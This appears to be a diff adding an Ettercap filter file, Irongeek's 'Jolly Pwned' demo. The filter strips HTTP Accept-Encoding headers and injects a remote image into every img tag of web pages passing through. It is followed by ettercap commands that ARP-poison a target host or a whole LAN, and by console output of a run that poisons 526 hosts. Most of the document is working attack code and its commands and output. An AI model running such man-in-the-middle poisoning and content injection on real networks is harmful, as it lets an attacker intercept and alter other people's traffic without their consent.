@@ -1,0 +1,73 @@
+Source code for ig.filter
+ 	
+############################################################################
+#                                                                          #
+#  Jolly Pwned -- ig.filter -- filter source file                          #
+#                                                                          #
+#  By Irongeek. based on code from ALoR & NaGA                             #
+#  Along with some help from Kev and jon.dmml                              #
+#  http://ettercap.sourceforge.net/forum/viewtopic.php?t=2833              #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  # note: replacement string is same length as original string
+      msg("zapped Accept-Encoding!\n");
+   }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+   replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+   msg("Filter Ran.\n");
+}
+
+
+- ettercap -T -q -F ig.ef -M ARP // //
+- ettercap -T -q -F ig.ef -M ARP /192.168.22.47/ //
+
+ettercap -T -q -F ig.ef -M ARP /192.168.22.47/ // output:
+root@Cthulhu:/usr/share/ettercap# ettercap -T -q -F ig.ef -M ARP /192.168.22.47/ //
+
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+Content filters loaded from ig.ef...
+Listening on eth0... (Ethernet)
+
+eth0 -> 00:04:56:B8:70:AD 192.168.19.56 255.255.240.0
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to UID 65534 GID 65534...
+
+28 plugins
+39 protocol dissectors
+53 ports monitored
+7587 mac vendor fingerprint
+1698 tcp OS fingerprint
+2183 known services
+
+Randomizing 4095 hosts for scanning...
+Scanning the whole netmask for 4095 hosts...
+* |==================================================>| 100.00 %
+
+526 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+GROUP 1 : 192.168.22.47 00:04:56:B8:70:AD
+
+GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+Filter Ran.
+Filter Ran.
+
+http://www.irongeek.com/i.php?page=security/ettercapfilter
